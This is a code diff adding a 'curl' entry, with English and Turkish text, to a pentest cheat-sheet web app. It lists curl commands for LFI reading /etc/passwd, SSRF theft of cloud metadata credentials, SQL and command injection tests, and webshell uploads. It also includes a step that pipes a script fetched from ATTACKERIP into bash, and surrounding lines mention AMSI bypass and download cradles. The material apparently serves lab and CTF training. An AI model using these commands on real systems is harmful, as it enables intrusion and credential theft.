@@ -1235,7 +1235,7 @@ function setLang(lang){state.lang=lang;saveState();applyLang();renderSidebar();i
 // ═══════════════════════════════════════════════════
 //  TOOLS DB
 // ═══════════════════════════════════════════════════
-const TOOLS_ORDER = ['nmap','gobuster','ffuf','nxc','enum4linux','nikto','hydra','nuclei','peass','sqlmap','impacket','xfreerdp','hashcrack','searchsploit','evilwinrm','msfvenom','responder','kerbrute','chisel','wpscan','zap','pspy','pwncat','les','pwntools','gdb','socat','strace','binwalk','psql'];
+const TOOLS_ORDER = ['nmap','gobuster','ffuf','curl','nxc','enum4linux','nikto','hydra','nuclei','peass','sqlmap','impacket','xfreerdp','hashcrack','searchsploit','evilwinrm','msfvenom','responder','kerbrute','chisel','wpscan','zap','pspy','pwncat','les','pwntools','gdb','socat','strace','binwalk','psql'];
 
 const TOOLS_INFO = {
   nmap:{
@@ -1536,6 +1536,21 @@ const TOOLS_INFO = {
       lookFor:["PowerShell execution policy — Restricted scriptleri engeller, Bypass/Unrestricted izin verir","AppLocker / WDAC — PowerShell'i, imzasız çalıştırılabilir dosyaları ve scriptleri engelleyebilir","AV/EDR durumu — Windows Defender tüm modern Windows'ta varsayılan açık","Web kök dizinine dosya yükleme — ASPX/PHP webshell bırak → oradan PS çalıştır","CVE üzerinden RCE — yamasız Windows servisleri (PrintSpooler, PetitPotam)","Yazılabilir dizinler — C:\\Windows\\Temp, C:\\Users\\Public genellikle yazılabilir"],
       vulns:["PowerShell one-liner — dosya bırakmaz, bellekte çalışır","Kodlanmış PS (-EncodedCommand) — temel anahtar kelime filtrelemesini atlatır","MSFvenom exe — basit ama AV tarafından işaretlenir; staged'i multi/handler ile kullan","LOTL (certutil, mshta, regsvr32) — uygulama beyaz listesini atlatır","Download cradle — IEX(IWR) HTTP sunucusundan payload çeker ve bellekte çalıştırır","AMSI bypass — PowerShell kötü amaçlı stringleri engellediğinde gerekli"],
       creds:["TARGETIP = kendi saldırgan/tun0 IP'niz, TARGETPORT = TARGET sayfasına girin","PowerShell Execution Policy bypass: -ExecutionPolicy Bypass veya Set-ExecutionPolicy","Defender engelliyorsa: payload'ı Base64'e kodla veya msfvenom staged payload kullan","Dinleyici için: temel PS için nc/rlwrap, meterpreter için Metasploit kullan","ASPX webshell IIS'de en güvenilirdir — dosya yükleme açığı veya yazılabilir web kökü aracılığıyla yükle","PS engelliyse: cmd.exe yöntemlerini dene (ncat.exe, certutil)"],
+    },
+  },
+  curl:{
+    platform:'both',
+    en:{
+      summary:"curl is the universal command-line HTTP client — available on every Linux, macOS, and modern Windows system. In pentesting it is used for manual HTTP request crafting, API interaction, LFI/SSRF/SQLi testing, file transfer, fingerprinting, and proxying through Burp Suite. Unlike a browser, curl gives full control over every part of the HTTP request: method, headers, body, cookies, and SSL handling.",
+      lookFor:["Response headers — Server, X-Powered-By, Set-Cookie (leak framework/version)","Different response sizes or status codes for varied inputs (injection indicators)","Redirects — follow with -L or observe with -v to see each Location header","SSRF — server-side requests back to your attacker IP (set up listener first)","File inclusion — path traversal sequences returning /etc/passwd content","Error messages revealing stack traces, DB info, or internal paths"],
+      vulns:["LFI: ../../../../etc/passwd or php://filter in file/path parameter","SSRF: Internal metadata 169.254.169.254, 127.0.0.1, file://, gopher://","SQLi: single quote ' triggers errors, AND 1=1 vs AND 1=2 behavioral diff","Command injection: ;id |id $(id) — look for uid= in response","Open redirect: redirect_to=http://evil.com — check Location header","CORS misconfiguration: Origin: evil.com returns Access-Control-Allow-Origin: *"],
+      creds:["-v shows full request AND response headers — use when debugging anything","-k bypasses SSL cert errors — always needed for Burp HTTPS interception","-s suppresses progress bar — clean output for piping to grep or jq","Pipe to jq for JSON: curl -s url | jq '.'","Quick status check: curl -s -o /dev/null -w '%{http_code}' url","Always proxy through Burp: --proxy http://127.0.0.1:8080 -k"],
+    },
+    tr:{
+      summary:"curl, her Linux, macOS ve modern Windows sistemde bulunan evrensel komut satırı HTTP istemcisidir. Pentest'te manuel HTTP isteği oluşturma, API etkileşimi, LFI/SSRF/SQLi testi, dosya transferi, parmak izi alma ve Burp Suite üzerinden proxy için kullanılır. Tarayıcının aksine curl; yöntem, headerlar, gövde, cookie'ler ve SSL işleme dahil her HTTP isteği parçası üzerinde tam kontrol sağlar.",
+      lookFor:["Yanıt headerları — Server, X-Powered-By, Set-Cookie (framework/versiyon sızdırır)","Farklı girdilere farklı yanıt boyutu veya durum kodu (injection göstergesi)","Yönlendirmeler — -L ile takip et veya -v ile Location headerlarını gözlemle","SSRF — saldırgan IP'ye geri dönen sunucu tarafı istekler (önce listener kur)","Dosya dahil etme — /etc/passwd döndüren path traversal dizileri","Dahili yolları, DB bilgilerini ortaya çıkaran hata mesajları"],
+      vulns:["LFI: dosya/yol parametresinde ../../../../etc/passwd veya php://filter","SSRF: Dahili metadata 169.254.169.254, 127.0.0.1, file://, gopher://","SQLi: tek tırnak ' hatalara yol açar, AND 1=1 vs AND 1=2 davranış farkı","Komut injection: ;id |id $(id) — yanıtta uid= ara","Açık yönlendirme: redirect_to=http://evil.com — Location headerını kontrol et","CORS yanlış yapılandırması: Origin: evil.com → Access-Control-Allow-Origin: *"],
+      creds:["-v hem istek hem yanıt headerlarını gösterir — hata ayıklarken mutlaka kullan","-k SSL sertifika hatalarını atlar — Burp HTTPS proxy için her zaman gerekli","-s ilerleme çubuğunu bastırır — grep veya jq'ya pipe için temiz çıktı","JSON için jq'ya pipe: curl -s url | jq '.'","Hızlı durum kodu kontrolü: curl -s -o /dev/null -w '%{http_code}' url","Her zaman Burp üzerinden proxy et: --proxy http://127.0.0.1:8080 -k"],
     },
   },
   binwalk:{
@@ -2569,6 +2584,60 @@ const TOOLS_DB = {
         {p:'Check for web app credentials',c:'find . -name "*.php" -o -name "*.asp" -o -name "*.conf" 2>/dev/null |\nxargs grep -l "password\|admin\|secret" 2>/dev/null',h:'Web application configs often contain hardcoded DB credentials and admin passwords.'},
         {p:'Strings analysis on binary blob',c:'strings extracted_binary | grep -iE "pass|key|token|secret|admin"\nstrings -n 8 firmware.bin | grep -v "^[^a-zA-Z]*$"',h:'strings on the raw firmware finds ASCII data. -n 8 minimum length reduces noise.'},
         {p:'File type identification',c:'file firmware.bin\nfile _firmware.bin.extracted/*',h:'file command identifies format of extracted files. Clarifies next steps — is it ELF, squashfs, zip, etc.'},
+      ]},
+    ],
+  },
+  curl:{
+    label:'curl', desc:'HTTP Swiss Army Knife',
+    categories:[
+      {name:'Basic Requests',cmds:[
+        {p:'GET — verbose (show all headers)',c:'curl -v http://TARGETIP/',h:'-v shows every request header sent and response header received. Use when something is unexpected — this is your best debugging flag.'},
+        {p:'GET — headers only (fingerprint)',c:'curl -I http://TARGETIP/\ncurl -I https://TARGETIP/',h:'HEAD request — no response body, just headers. Fast way to see Server, X-Powered-By, Content-Type, Set-Cookie without downloading the page.'},
+        {p:'GET — follow redirects',c:'curl -L http://TARGETIP/',h:'-L follows all 301/302 redirects. Combine with -v to see each redirect step, status codes, and final destination.'},
+        {p:'POST — form data',c:'curl -X POST -d "username=admin&password=admin" http://TARGETIP/login',h:'Standard HTML form POST. Content-Type: application/x-www-form-urlencoded by default. Check -v output for Set-Cookie (session token).'},
+        {p:'POST — JSON body',c:'curl -X POST -H "Content-Type: application/json" -d \'{"username":"admin","password":"admin"}\' http://TARGETIP/api/login',h:'JSON POST for API endpoints. Always set Content-Type header or server rejects the body. Check response for token/session.'},
+        {p:'PUT / DELETE / PATCH',c:'curl -X PUT -H "Content-Type: application/json" -d \'{"name":"test"}\' http://TARGETIP/api/item/1\ncurl -X DELETE http://TARGETIP/api/item/1\ncurl -X PATCH -d \'{"role":"admin"}\' http://TARGETIP/api/user/1',h:'REST API methods. Check allowed methods first: curl -X OPTIONS -v http://TARGETIP/ — look for Allow: header.'},
+        {p:'Custom headers',c:'curl -H "X-Forwarded-For: 127.0.0.1" http://TARGETIP/admin\ncurl -H "Authorization: Bearer TOKEN" -H "X-Custom-Header: value" http://TARGETIP/',h:'Multiple -H flags stack. X-Forwarded-For, X-Real-IP, X-Original-URL — common auth bypass headers. Try 127.0.0.1, ::1, localhost.'},
+      ]},
+      {name:'Authentication & Sessions',cmds:[
+        {p:'HTTP Basic Auth',c:'curl -u admin:password http://TARGETIP/protected\ncurl -u admin: http://TARGETIP/protected',h:'-u user:pass sends Basic Auth (base64-encoded). -u admin: tries empty password. Check response — 200 = valid creds.'},
+        {p:'Bearer token / API key',c:'curl -H "Authorization: Bearer YOURJWTTOKEN" http://TARGETIP/api/me\ncurl -H "X-API-Key: YOURAPIKEY" http://TARGETIP/api/data',h:'JWT tokens and API keys go in the Authorization header. Get from login response, app JS source, or burp intercept.'},
+        {p:'Login and save cookies to file',c:'curl -s -c cookies.txt -X POST -d "user=admin&pass=admin" -L http://TARGETIP/login',h:'-c cookies.txt saves all Set-Cookie headers. -L follows the post-login redirect. Use cookies.txt on subsequent requests.'},
+        {p:'Send saved cookies',c:'curl -b cookies.txt http://TARGETIP/dashboard\ncurl -b cookies.txt -c cookies.txt http://TARGETIP/dashboard',h:'-b reads cookies from file. Add -c to also save any new cookies (e.g. refreshed session tokens).'},
+        {p:'Set cookie manually (manipulation)',c:'curl -b "session=abc123; role=admin; isAdmin=true" http://TARGETIP/admin',h:'Manually craft cookie value. Useful for testing cookie-based privilege escalation or session forgery.'},
+        {p:'Digest / NTLM Auth',c:'curl --digest -u admin:password http://TARGETIP/protected\ncurl --ntlm -u DOMAIN\\\\user:password http://TARGETIP/protected',h:'--digest for Digest auth. --ntlm for Windows NTLM (common on IIS). Combine with --proxy for Burp interception.'},
+      ]},
+      {name:'Web Recon',cmds:[
+        {p:'Common recon files',c:'curl -s http://TARGETIP/robots.txt\ncurl -s http://TARGETIP/sitemap.xml\ncurl -s http://TARGETIP/.htaccess\ncurl -s http://TARGETIP/crossdomain.xml\ncurl -s http://TARGETIP/security.txt',h:'robots.txt reveals admin panels and hidden paths. .htaccess may be world-readable. security.txt shows contact and bug bounty info.'},
+        {p:'Status code check (no body)',c:'curl -s -o /dev/null -w "%{http_code}" http://TARGETIP/admin',h:'-o /dev/null discards body, -w prints status code only. 200=exists 403=forbidden(interesting!) 404=not found 301/302=redirect.'},
+        {p:'Check multiple paths (quick scan)',c:'for p in /admin /login /dashboard /api /backup /config /.git /phpmyadmin /console; do printf "%-20s %s\\n" "$p" "$(curl -s -o /dev/null -w "%{http_code}" http://TARGETIP$p)"; done',h:'Quick manual directory check. 200/302 = investigate. 403 = exists but forbidden (still interesting). Add -L for redirects.'},
+        {p:'Extract links and endpoints from page',c:'curl -s http://TARGETIP/ | grep -oE \'(href|src|action)="[^"]+"\' | sort -u',h:'Quick link harvest. Reveals API endpoints, form actions, JS files, hidden paths. Feed to gobuster/ffuf for further enum.'},
+        {p:'CORS misconfiguration check',c:'curl -s -I -H "Origin: https://evil.com" http://TARGETIP/api/data | grep -i "access-control"',h:'If Access-Control-Allow-Origin: https://evil.com or * → CORS bug. May allow cross-origin JS to read authenticated API responses.'},
+        {p:'Trace redirect chain (verbose)',c:'curl -v -L http://TARGETIP/ 2>&1 | grep -E "^[<>]|Location:|HTTP/"',h:'Shows every redirect hop with status codes and Location headers. Reveals internal hostnames or URLs in redirection chain.'},
+      ]},
+      {name:'Web Exploitation — Testing',cmds:[
+        {p:'LFI — path traversal payloads',c:'curl "http://TARGETIP/page.php?file=../../../../etc/passwd"\ncurl "http://TARGETIP/page.php?file=....//....//etc/passwd"\ncurl "http://TARGETIP/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"',h:'200 with root:x:0:0: in body = LFI confirmed. php://filter returns base64 — decode: curl ... | base64 -d. Try /proc/self/environ for env vars.'},
+        {p:'SSRF — callback test',c:'# 1. Start listener:\npython3 -m http.server 80\n# 2. Trigger:\ncurl "http://TARGETIP/page?url=http://ATTACKERIP/probe"',h:'Callback to your IP = SSRF confirmed. Then escalate: 127.0.0.1, file:///etc/passwd, gopher://, 169.254.169.254 (cloud).'},
+        {p:'SSRF — AWS / cloud metadata',c:'curl "http://TARGETIP/fetch?url=http://169.254.169.254/latest/meta-data/"\ncurl "http://TARGETIP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',h:'AWS metadata endpoint returns IAM credentials. Azure: 169.254.169.254/metadata/instance. GCP: metadata.google.internal'},
+        {p:'SQL injection — quick test',c:'curl -s "http://TARGETIP/page?id=1\'"\ncurl -s "http://TARGETIP/page?id=1 AND 1=1--"\ncurl -s "http://TARGETIP/page?id=1 AND 1=2--"',h:'Single quote = syntax error test. AND 1=1 vs AND 1=2 → different page content = Boolean SQLi. Compare response lengths.'},
+        {p:'Command injection — quick test',c:'curl -s "http://TARGETIP/ping?host=127.0.0.1;id"\ncurl -s "http://TARGETIP/ping?host=127.0.0.1|id"\ncurl -s "http://TARGETIP/exec?cmd=id"',h:'Look for uid= in the response. Time-based blind: replace id with sleep 5 and measure response time with --max-time 10.'},
+        {p:'Open redirect test',c:'curl -v "http://TARGETIP/redirect?url=http://evil.com" 2>&1 | grep "Location:"',h:'If Location: http://evil.com → open redirect. Used for OAuth token theft and phishing with trusted domain URL.'},
+      ]},
+      {name:'File Transfer',cmds:[
+        {p:'Download file',c:'curl -O http://TARGETIP/file.txt\ncurl -o /tmp/output.txt http://TARGETIP/file.txt\ncurl -L -O http://TARGETIP/tool.sh',h:'-O saves with original name. -o saves to specified path. -L follows redirects to the actual file (GitHub releases, etc.).'},
+        {p:'Upload file — multipart form',c:'curl -X POST -F "file=@shell.php" http://TARGETIP/upload\ncurl -X POST -F "file=@shell.php;type=image/jpeg" -F "submit=Upload" http://TARGETIP/upload',h:'-F @file sends multipart upload. Set type= to spoof MIME type (bypass weak client-side checks). Check server-side validation too.'},
+        {p:'Upload file — PUT (WebDAV)',c:'curl -X PUT -T shell.php http://TARGETIP/uploads/shell.php',h:'DAV PUT upload on misconfigured WebDAV servers. Check OPTIONS first: curl -X OPTIONS -v http://TARGETIP/ — look for Allow: PUT.'},
+        {p:'Download resume',c:'curl -C - -O http://TARGETIP/largefile.zip',h:'-C - auto-resumes partial download. Good for large binaries over unstable tunnels. Creates the file if not started yet.'},
+        {p:'Serve and fetch payload (attacker↔target)',c:'# Attacker — serve files:\npython3 -m http.server 8000\n# Target — download:\ncurl http://ATTACKERIP:8000/linpeas.sh | bash\ncurl http://ATTACKERIP:8000/tool -o /tmp/tool && chmod +x /tmp/tool',h:'Classic payload delivery. Run python3 http.server in your tools directory. Pipe to bash for fileless execution.'},
+      ]},
+      {name:'Proxy, SSL & Advanced',cmds:[
+        {p:'Route through Burp Suite',c:'curl --proxy http://127.0.0.1:8080 -k http://TARGETIP/\ncurl --proxy http://127.0.0.1:8080 -k -X POST -d "data=value" http://TARGETIP/api',h:'--proxy sends all traffic through Burp for interception and modification. -k required for Burp HTTPS. Do this for any serious manual testing.'},
+        {p:'Route through SOCKS5 proxy (tunnel)',c:'curl --socks5 127.0.0.1:1080 http://internal-host/\ncurl --socks5-hostname 127.0.0.1:1080 http://internal.target.local/',h:'Send through chisel/ligolo SOCKS5 tunnel. --socks5-hostname resolves DNS through the proxy — required for internal hostnames.'},
+        {p:'Skip SSL verification',c:'curl -k https://TARGETIP/\ncurl --insecure https://TARGETIP/',h:'-k / --insecure skips SSL cert errors. Required on self-signed certs (most CTF/lab HTTPS). Always combine with Burp proxy.'},
+        {p:'Custom User-Agent (WAF bypass)',c:'curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120" http://TARGETIP/\ncurl -A "" http://TARGETIP/',h:'WAFs often block "curl/7.x" user-agent. Mimic a browser. Also try: -A "sqlmap/1.7" if WAF whitelists known scanners.'},
+        {p:'Timeout and timing',c:'curl --connect-timeout 3 --max-time 10 http://TARGETIP/\n# Time-based blind injection (watch for delay):\ntime curl -s "http://TARGETIP/page?id=1 AND SLEEP(5)--"',h:'--connect-timeout = TCP handshake timeout. --max-time = total request limit. Wrap with time for timing-based blind injection detection.'},
+        {p:'Virtual host / Host header testing',c:'curl -H "Host: admin.TARGETIP" http://TARGETIP/\ncurl -H "Host: internal.corp.local" http://TARGETIP/\ncurl --resolve dev.target.local:80:TARGETIP http://dev.target.local/',h:'Virtual host fuzzing — different hostname = different app. --resolve maps hostname to IP without editing /etc/hosts.'},
+        {p:'JSON pretty-print and status info',c:'curl -s http://TARGETIP/api/data | python3 -m json.tool\ncurl -s http://TARGETIP/api/data | jq \'.\'\ncurl -w "\\nHTTP %{http_code} | %{time_total}s | %{size_download}B\\n" -o /dev/null http://TARGETIP/',h:'Pipe to jq or json.tool for readable JSON. -w format string prints code/time/size after response — useful for comparing responses.'},
       ]},
     ],
   },
